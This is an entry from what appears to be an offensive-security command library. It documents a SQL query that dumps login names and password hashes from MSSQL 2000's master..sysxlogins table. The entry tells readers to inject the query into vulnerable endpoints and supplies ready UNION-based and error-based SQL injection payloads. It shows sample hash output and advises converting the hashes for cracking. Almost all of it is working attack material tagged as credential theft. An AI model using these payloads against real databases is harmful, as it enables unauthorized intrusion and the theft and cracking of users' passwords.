---
id: d8e78a14-ecde-4d6b-9238-21141539afa7
name: mssql-2000-select-name-password-sysxlogins
type: command
executor: sql
data: 'SELECT name, password FROM master..sysxlogins'
output: null
created_at: '2023-04-06T03:56:33.738034+00:00'
updated_at: '2023-04-10T20:22:43.467446+00:00'
platforms:
  - Windows
tags:
  - mssql
  - credential-theft
verified: true
validated: true
---

# mssql-2000-select-name-password-sysxlogins

## Command

```sql
SELECT name, password FROM master..sysxlogins
```

## Description

This SQL command queries the sysxlogins system table in MSSQL 2000 to retrieve SQL login usernames and their corresponding password values (stored as varbinary). Use this via SQL injection to dump credentials when direct access is unavailable.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| None | This is a static SELECT query; no runtime parameters. Inject into vulnerable endpoints. | N/A |

## Examples

### Basic Usage

Inject into a SQLi payload, e.g., `' UNION SELECT name, password FROM master..sysxlogins --`

### Error-Based Usage

For blind/error-based: `' AND 1=CAST((SELECT name, password FROM master..sysxlogins) AS varchar(8000)) --`

## Expected Output

A result set displaying login details:

name | password
---|---
sa | 0x010500000000000015000000A8B6...
user1 | 0x0101000000000000...

The password field shows varbinary representation; convert to hex if needed for cracking.

## Related

- [[procedures/MSSQL-Credential-Theft-via-SQL-Injection]]
- [[commands/mssql-2000-select-name-hex-password-sysxlogins]]
